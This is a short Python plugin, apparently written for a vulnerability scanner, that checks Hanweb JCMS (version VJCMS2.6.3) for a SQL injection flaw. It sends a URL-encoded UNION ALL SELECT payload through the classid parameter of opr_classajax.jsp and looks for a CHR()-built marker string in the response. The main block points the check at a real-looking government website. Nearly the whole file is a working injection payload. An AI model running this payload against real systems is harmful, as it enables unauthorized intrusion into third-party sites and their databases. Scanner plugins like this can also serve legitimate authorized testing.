# !/usr/bin/dev python
# -*- coding:utf-8 -*-
#_Author_= 7d0y
#_PlugName_ = 大汉JCMS系统SQL注入漏洞 版本：VJCMS2.6.3-ZZSZF[U11]
#_FileName_ = jcms.py
#_Refer= http://www.wooyun.org/bugs/wooyun-2014-087751

import re
import time
import math

def assign(service, arg):
    if service == "hanweb":
        return True, arg

def audit(args):
    payload = "jcms/jcms_files/jcms1/web1/site/module/sitesearch/opr_classajax.jsp?classid=11%20UNION%20ALL%20SELECT%20NULL,CHR(113)||CHR(122)||CHR(113)||CHR(106)||CHR(113)||CHR(78)||CHR(89)||CHR(99)||CHR(76)||CHR(117)||CHR(72)||CHR(100)||CHR(80)||CHR(72)||CHR(107)||CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)%20FROM%20DUAL--"
    verify_url = args + payload
    code, head,res, errcode, _ = curl.curl(verify_url)
    if code == 200 and "qzqjqNYcLuHdPHkqkjvq" in res:
        security_hole(verify_url)     
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('hanweb', 'http://ipad.zaozhuang.gov.cn/')[1])